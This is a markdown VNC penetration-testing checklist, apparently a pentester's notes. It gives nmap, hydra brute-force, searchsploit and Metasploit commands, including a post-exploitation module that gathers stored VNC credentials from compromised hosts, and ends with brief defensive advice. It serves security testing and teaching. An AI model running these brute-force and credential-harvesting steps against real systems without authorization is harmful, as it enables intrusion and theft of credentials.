# ‚úÖ VNC Pentesting Checklist & Commands

---

## üéØ What am I realistically expecting to find here?

‚≠ê After enumerating VNC (port 5900), I realistically expect to find:

- [ ] Service banner with version info (for exploit mapping)
- [ ] No-authentication allowed (misconfiguration)
- [ ] Weak or default passwords that allow login
- [ ] Ability to brute-force and discover valid passwords
- [ ] Unencrypted sessions that can leak sensitive info
- [ ] Credentials to reuse on other services
- [ ] Post-exploitation: dump saved VNC credentials from compromised hosts

---

## ‚úÖ VNC Pentest Checklist

- [ ] **Banner Grabbing / Version Detection**
    ```bash
    nmap -sV -p 5900 <IP>
    ```

- [ ] **Check for No-Authentication Allowed**
    - Some VNC servers permit connections with no password.
    - Test with:
      ```bash
      vncviewer <IP>:<PORT>
      ```

- [ ] **Check for Easy / Default Passwords**
    - Attempt connecting with common passwords manually.
    - Examples: `password`, `admin`, `1234`.

- [ ] **Brute-Force VNC Password**
    ```bash
    hydra -s 5900 -P /usr/share/seclists/Passwords/darkweb2017-top10.txt -t 30 <IP> vnc
    hydra -L <USERS_LIST> -P <PASSWORDS_LIST> -s <PORT> <IP> vnc -u -vV
    ```

- [ ] **Check for Exploits for VNC Version**
    ```bash
    searchsploit vnc
    ```

- [ ] **Post-Exploitation**
    - Grab stored credentials from compromised hosts.
    - Use recovered passwords to reconnect using VNC clients.

---

## ‚úÖ VNC Useful Commands

- **Nmap Scanning**
    ```bash
    nmap -sV -Pn -p 5900 --script=vnc-info,vnc-title,realvnc-auth-bypass <IP> -oA 5900_nmap_VNC
    nmap -sV --script vnc-info,realvnc-auth-bypass,vnc-title -p 5900,5800 <IP>
    ```

- **Metasploit Modules**
    - **Login Scanner**
        ```bash
        use auxiliary/scanner/vnc/vnc_login
        set rhosts <IP>
        run
        ```
    - **No-Auth Scanner**
        ```bash
        use auxiliary/scanner/vnc/vnc_none_auth
        set rhosts <IP>
        run
        ```
    - **Post-Exploitation Credential Gather**
        ```bash
        background
        use post/windows/gather/credentials/vnc
        set session <SESSION_ID>
        run
        ```

- **Brute-Force Examples**
    ```bash
    hydra -s 5900 -P /usr/share/wordlists/rockyou.txt <IP> vnc
    ```

- **Connecting with vncviewer**
    ```bash
    vncviewer [-passwd passwd.txt] <IP>::5901
    vncviewer <IP>:<PORT>
    ```

---

## ‚úÖ Defensive Recommendations

- Enforce strong passwords for all VNC accounts.
- Disable unauthenticated access.
- Restrict access to trusted IP addresses only.
- Tunnel VNC over SSH or VPN to prevent interception.
- Regularly update and patch VNC software.
